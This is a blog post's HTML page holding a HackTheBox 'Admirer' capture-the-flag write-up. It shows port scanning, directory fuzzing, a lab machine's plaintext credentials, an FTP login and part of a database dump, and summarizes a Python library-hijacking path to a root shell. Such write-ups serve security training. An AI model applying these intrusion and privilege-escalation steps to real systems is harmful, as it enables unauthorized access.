<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Nmap results and Gobuster reveals `robot.txt` file which is dissallowing a dir called `admin-dir` running wfuzz against it we got two files `contacts.txt` and `credentials.txt` which contains ftp user and pass.Got some files in ftp server.We got an another directory `utility-scripts` and fuzzing the dir we got another file `adminer.php` which is running the adminer-database on it.Connecting our `mysql` database with the adminer we can write `adminer-db` data to our `data` and so we got a `password` for user `waldo`.And the user **waldo** can run a script as `root`.Privilege escalation via `python library path hijacking` and running script as root we got a root `shell` by using **netcat** bind `shell`." /><meta property="og:title" content="Hackthebox Admirer writeup" /><meta property="og:description" content="Nmap results and Gobuster reveals `robot.txt` file which is dissallowing a dir called `admin-dir` running wfuzz against it we got two files `contacts.txt` and `credentials.txt` which contains ftp user and pass.Got some files in ftp server.We got an another directory `utility-scripts` and fuzzing the dir we got another file `adminer.php` which is running the adminer-database on it.Connecting our `mysql` database with the adminer we can write `adminer-db` data to our `data` and so we got a `password` for user `waldo`.And the user **waldo** can run a script as `root`.Privilege escalation via `python library path hijacking` and running script as root we got a root `shell` by using **netcat** bind `shell`." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/admirer/admirer.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Admirer writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Nmap results and Gobuster reveals `robot.txt` file which is dissallowing a dir called `admin-dir` running wfuzz against it we got two files `contacts.txt` and `credentials.txt` which contains ftp user and pass.Got some files in ftp server.We got an another directory `utility-scripts` and fuzzing the dir we got another file `adminer.php` which is running the adminer-database on it.Connecting our `mysql` database with the adminer we can write `adminer-db` data to our `data` and so we got a `password` for user `waldo`.And the user **waldo** can run a script as `root`.Privilege escalation via `python library path hijacking` and running script as root we got a root `shell` by using **netcat** bind `shell`."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/admirer/admirer.png"><title>Hackthebox Admirer writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Admirer writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Admirer writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, May 4, 2020, 12:00 AM +0800" > May 4 <i class="unloaded">2020-05-04T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/admirer.png" class="post-preview-img"><h1 id="informationadmirer">Information@admirer:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Admirer<tr><td>IP<td>10.10.10.187<tr><td>Points<td>20<tr><td>Os<td>Linux<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/159204" target="_blank">polarbearer</a> and <a href="https://www.hackthebox.eu/home/users/profile/125033" target="_blank">GibParadox</a><tr><td>Out On<td>2 May 2020</table></div><h1 id="briefadmirer">Brief@admirer:~$</h1><p>Nmap results and Gobuster reveals <code class="language-plaintext highlighter-rouge">robot.txt</code> file which is dissallowing a dir called <code class="language-plaintext highlighter-rouge">admin-dir</code> running wfuzz against it we got two files <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code> which contains ftp user and pass.Got some files in ftp server.We got an another directory <code class="language-plaintext highlighter-rouge">utility-scripts</code> and fuzzing the dir we got another file <code class="language-plaintext highlighter-rouge">adminer.php</code> which is running the adminer-database on it.Connecting our <code class="language-plaintext highlighter-rouge">mysql</code> database with the adminer we can write <code class="language-plaintext highlighter-rouge">adminer-db</code> data to our <code class="language-plaintext highlighter-rouge">data</code> and so we got a <code class="language-plaintext highlighter-rouge">password</code> for user <code class="language-plaintext highlighter-rouge">waldo</code>.And the user <strong>waldo</strong> can run a script as <code class="language-plaintext highlighter-rouge">root</code>.Privilege escalation via <code class="language-plaintext highlighter-rouge">python library path hijacking</code> and running script as root we got a root <code class="language-plaintext highlighter-rouge">shell</code> by using <strong>netcat</strong> bind <code class="language-plaintext highlighter-rouge">shell</code>.</p><h1 id="summaryadmirer">Summary@admirer:~$</h1><ul><li>Gobuster reveals a dir called <code class="language-plaintext highlighter-rouge">admin-dir</code><li>FUZZING the dir we got two files <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>.<li>File <strong>credentials.txt</strong> contains some user and pass including <code class="language-plaintext highlighter-rouge">ftp</code><li>Got some <code class="language-plaintext highlighter-rouge">backup</code> files which has a dir called <code class="language-plaintext highlighter-rouge">utility-scripts</code> , <code class="language-plaintext highlighter-rouge">usernames</code> ,<strong>password</strong><li>FUZZING this dir got a file called <code class="language-plaintext highlighter-rouge">adminer.php</code><li>The file was serving <code class="language-plaintext highlighter-rouge">adminer-db</code> service .<li>There are some public <strong>exploits</strong> and <code class="language-plaintext highlighter-rouge">vulnerablites</code> are available .<li>By running our <code class="language-plaintext highlighter-rouge">mysql</code> <strong>server</strong> with proper conditions and <code class="language-plaintext highlighter-rouge">privileges</code> we logged in to <strong>adminer</strong>.<li>We can write the <code class="language-plaintext highlighter-rouge">machine</code> data to our own <strong>database</strong><li>We write <code class="language-plaintext highlighter-rouge">index.php</code> of dir <code class="language-plaintext highlighter-rouge">utility-scripts</code> file to our <code class="language-plaintext highlighter-rouge">database</code> which was forbidden for us.<li>Got a real <strong>password</strong> for user <code class="language-plaintext highlighter-rouge">waldo</code>.<li>Logged in to ssh as user <code class="language-plaintext highlighter-rouge">waldo</code>.<li>Got <code class="language-plaintext highlighter-rouge">user.txt</code>.<li>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> we get to know that user <strong>waldo</strong> can run two commands as root.<li>First the script <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> and second it use <code class="language-plaintext highlighter-rouge">setenv</code> as root.<li>The script is running <code class="language-plaintext highlighter-rouge">backup.py</code> and if we look at the <code class="language-plaintext highlighter-rouge">backup.py</code><li><code class="language-plaintext highlighter-rouge">Python</code> <strong>library</strong> <code class="language-plaintext highlighter-rouge">path</code> <strong>hijacking</strong> can work here because we can set <code class="language-plaintext highlighter-rouge">path</code>.<li><strong>Making</strong> a custom file called <code class="language-plaintext highlighter-rouge">shutil.py</code> containing a <code class="language-plaintext highlighter-rouge">reverse-shell</code><li>After <strong>setting</strong> a <code class="language-plaintext highlighter-rouge">new</code> <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> as sudo and running script with option <code class="language-plaintext highlighter-rouge">6</code>.<li>Pop-uped a <code class="language-plaintext highlighter-rouge">root-shell</code><li>Got <code class="language-plaintext highlighter-rouge">root.txt</code></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/admirer/admirer.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>➜  admirer nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-v</span> admirer.htb
<span class="c"># Nmap 7.80 scan initiated Sun May  3 07:31:13 2020 as: nmap -sC -sV -T4 -p- -oA scans/nmap.full -v admirer.htb</span>
Nmap scan report <span class="k">for </span>admirer.htb <span class="o">(</span>10.10.10.187<span class="o">)</span>
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Admirer
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun May  3 07:47:16 2020 -- 1 IP address (1 host up) scanned in 963.00 seconds</span>
</pre></table></code></div></div><p>Three ports <code class="language-plaintext highlighter-rouge">21:ftp</code> , <code class="language-plaintext highlighter-rouge">22:ssh</code> , <code class="language-plaintext highlighter-rouge">80:http</code> are opened lets enumerate on ftp one first.</p><h2 id="ftp">Ftp</h2><p>I tried to check any <code class="language-plaintext highlighter-rouge">anonymous</code> login for the <code class="language-plaintext highlighter-rouge">ftp</code> but nah ! thats was just a guess</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>➜  admirer ftp admirer.htb 
Connected to admirer.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>admirer.htb:prashant<span class="o">)</span>: anonymous
530 Permission denied.
Login failed.
ftp&gt; 
</pre></table></code></div></div><h2 id="port-80">Port 80</h2><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-2.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-2.png" alt="port-80" /></a></p><p>In our nmap scan we got a <code class="language-plaintext highlighter-rouge">disallow</code> entry for the dir <code class="language-plaintext highlighter-rouge">admin-dir</code> from the <code class="language-plaintext highlighter-rouge">robots.txt</code> and we can confirm the file via gobuster too.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>➜  admirer gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-k</span>   <span class="nt">-x</span> <span class="s2">"txt,html,php,asp,aspx,jpg"</span> <span class="nt">-u</span> http://admirer.htb/
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://admirer.htb/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     aspx,jpg,txt,html,php,asp
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/05/03 07:33:02 Starting gobuster
<span class="o">===============================================================</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/images <span class="o">(</span>Status: 403<span class="o">)</span>
/assets <span class="o">(</span>Status: 403<span class="o">)</span>
/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
</pre></table></code></div></div><p>and there are <code class="language-plaintext highlighter-rouge">two</code> more dirs <strong>images</strong> and <strong>assets</strong> which have a response <code class="language-plaintext highlighter-rouge">403</code>.</p><p>and here is <code class="language-plaintext highlighter-rouge">/robots.txt</code></p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-1.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-1.png" alt="robots.txt" /></a></p><p>There is an entry for disallowing a a dir <code class="language-plaintext highlighter-rouge">admin-dir</code></p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-3.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-3.png" alt="Port-80" /></a></p><p>Lets fuzz on it using <code class="language-plaintext highlighter-rouge">wfuzz</code>.I used the dictionary <a href="https://raw.githubusercontent.com/gwen001/SecLists/master/Discovery/Web_Content/big.txt">Seclists-big.txt</a></p><h2 id="fuzzing-on-admin-dir">Fuzzing on admin-dir</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>➜  prashant wfuzz <span class="nt">-w</span> /usr/share/wordlists/big.txt <span class="nt">-u</span> http://admirer.htb/admin-dir/FUZZ.FUZ2Z <span class="nt">-z</span> list,txt-php <span class="nt">--hc</span> 403,404  <span class="nt">-c</span>            

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://admirer.htb/admin-dir/FUZZ.FUZ2Z
Total requests: 20473

<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                              
<span class="o">===================================================================</span>

000005198:   200        29 L     39 W     350 Ch      <span class="s2">"contacts - txt"</span>                                                                     
000005443:   200        11 L     13 W     136 Ch      <span class="s2">"credentials - txt"</span> 
</pre></table></code></div></div><p>Got two txt files <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>. lets enumerate on these.</p><blockquote><p>contacts.txt</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
</pre></table></code></div></div><blockquote><p>credentials.txt</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</pre></table></code></div></div><h1 id="got-into-ftp">Got into ftp</h1><p>We got three <code class="language-plaintext highlighter-rouge">usernames</code> and their passwords main are <code class="language-plaintext highlighter-rouge">ftp</code> ones.</p><p>Lets try to login to <code class="language-plaintext highlighter-rouge">ftp</code> using these <code class="language-plaintext highlighter-rouge">credentials</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  admirer ftp admirer.htb
Connected to admirer.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>admirer.htb:prashant<span class="o">)</span>: ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt;
</pre></table></code></div></div><p>I got two files from there <code class="language-plaintext highlighter-rouge">dump.sql</code> and <code class="language-plaintext highlighter-rouge">html.tar.gz</code> i downloaded both of them to my machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ftp&gt; get dump.sql
ftp&gt; get html.tar.gz
</pre></table></code></div></div><p>and now here is <code class="language-plaintext highlighter-rouge">dump.sql</code></p><blockquote><p><code class="language-plaintext highlighter-rouge">dump.sql</code></p></blockquote><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="err">➜</span>  <span class="n">admirer</span> <span class="n">cat</span> <span class="n">dump</span><span class="p">.</span><span class="k">sql</span> 
<span class="c1">-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)</span>
<span class="c1">--</span>
<span class="c1">-- Host: localhost    Database: admirerdb</span>
<span class="c1">-- ------------------------------------------------------</span>
<span class="c1">-- Server version	10.1.41-MariaDB-0+deb9u1</span>

<span class="cm">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span><span class="p">;</span>
<span class="cm">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span><span class="p">;</span>
<span class="cm">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span><span class="p">;</span>
<span class="cm">/*!40101 SET NAMES utf8mb4 */</span><span class="p">;</span>
<span class="cm">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */</span><span class="p">;</span>
<span class="cm">/*!40103 SET TIME_ZONE='+00:00' */</span><span class="p">;</span>
<span class="cm">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */</span><span class="p">;</span>
<span class="cm">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */</span><span class="p">;</span>
<span class="cm">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */</span><span class="p">;</span>
<span class="cm">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */</span><span class="p">;</span>

<span class="c1">--</span>
<span class="c1">-- Table structure for table `items`</span>
<span class="c1">--</span>

<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="nv">`items`</span><span class="p">;</span>
<span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span>
<span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nv">`items`</span> <span class="p">(</span>
  <span class="nv">`id`</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
  <span class="nv">`thumb_path`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`image_path`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`title`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`text`</span> <span class="nb">text</span><span class="p">,</span>
  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="nv">`id`</span><span class="p">)</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span> <span class="n">AUTO_INCREMENT</span><span class="o">=</span><span class="mi">13</span> <span class="k">DEFAULT</span> <span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8mb4</span><span class="p">;</span>
<span class="cm">/*!40101 SET character_set_client = @saved_cs_client */</span><span class="p">;</span>

<span class="c1">--</span>
<span class="c1">-- Dumping data for table `items`</span>
<span class="c1">--</span>

<span class="k">LOCK</span> <span class="n">TABLES</span> <span class="nv">`items`</span> <span class="k">WRITE</span><span class="p">;</span>
<span class="cm">/*!40000 ALTER TABLE `items` DISABLE KEYS */</span><span class="p">;</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="nv">`items`</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_art01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/art01.jpg'</span><span class="p">,</span><span class="s1">'Visual Art'</span><span class="p">,</span><span class="s1">'A pure showcase of skill and emotion.'</span><span class="p">),(</span><span class="mi">2</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_eng02.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/eng02.jpg'</span><span class="p">,</span><span class="s1">'The Beauty and the Beast'</span><span class="p">,</span><span class="s1">'Besides the technology, there is also the eye candy...'</span><span class="p">),(</span><span class="mi">3</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_nat01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/nat01.jpg'</span><span class="p">,</span><span class="s1">'The uncontrollable lightshow'</span><span class="p">,</span><span class="s1">'When the sun decides to play at night.'</span><span class="p">),(</span><span class="mi">4</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_arch02.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/arch02.jpg'</span><span class="p">,</span><span class="s1">'Nearly Monochromatic'</span><span class="p">,</span><span class="s1">'One could simply spend hours looking at this indoor square.'</span><span class="p">),(</span><span class="mi">5</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_mind01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/mind01.jpg'</span><span class="p">,</span><span class="s1">'Way ahead of his time'</span><span class="p">,</span><span class="s1">'You probably still use some of his inventions... 500yrs later.'</span><span class="p">),(</span><span class="mi">6</span><span class="p">,</span><span 